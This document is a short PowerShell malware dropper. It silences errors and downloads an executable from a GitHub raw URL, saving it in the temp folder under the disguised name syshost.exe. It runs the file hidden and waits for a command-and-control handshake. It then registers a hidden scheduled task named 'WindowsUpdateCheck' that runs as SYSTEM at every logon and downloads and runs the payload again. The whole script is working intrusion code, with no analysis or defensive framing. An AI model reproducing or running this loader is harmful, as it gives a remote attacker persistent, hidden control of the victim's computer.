# ==========================================
# PRODUCTION DEPLOY (Waits for C2 + Stable)
# ==========================================

$ErrorActionPreference='SilentlyContinue';$InformationPreference='SilentlyContinue'

# CONFIG
$PayloadUrl='https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/WmiPrvSE.exe'
$TaskName='WindowsUpdateCheck'

# CLEANUP
schtasks /delete /tn $TaskName /f 2>$null
Remove-Item "$env:APPDATA\Microsoft\Windows\Templates\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\syshost.exe" -Force -ErrorAction SilentlyContinue

# IMMEDIATE EXECUTE (EXE + WAIT)
$wc=New-Object Net.WebClient
$bytes=$wc.DownloadData($PayloadUrl)
$payloadPath="$env:TEMP\syshost.exe"
[IO.File]::WriteAllBytes($payloadPath,$bytes)

# START EXE + WAIT 10 SECONDS FOR C2
$proc=Start-Process $payloadPath -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 10

# PERSISTENCE (Logon Trigger)
$service=New-Object -ComObject Schedule.Service
$service.Connect()
$rootFolder=$service.GetFolder("\")
try{$rootFolder.DeleteTask($TaskName,0)}catch{}
$taskDef=$service.NewTask(0)
$taskDef.Settings.Enabled=$true
$taskDef.Settings.Hidden=$true
$taskDef.Settings.ExecutionTimeLimit="PT5M"
$trigger=$taskDef.Triggers.Create(9)
$trigger.Enabled=$true
$action=$taskDef.Actions.Create(0)
$action.Path="powershell.exe"
$action.Arguments="-WindowStyle Hidden -Command `"`$b=(New-Object Net.WebClient).DownloadData('$PayloadUrl');`$p=`"$env:TEMP\syshost.exe`";[IO.File]::WriteAllBytes(`$p,`$b);Start-Process `$p -WindowStyle Hidden;Start-Sleep 10`""
$rootFolder.RegisterTaskDefinition($TaskName,$taskDef,6,"SYSTEM",$null,4)|Out-Null

# KEEP POWERSHELL ALIVE 30s (C2 handshake)
Start-Sleep -Seconds 30
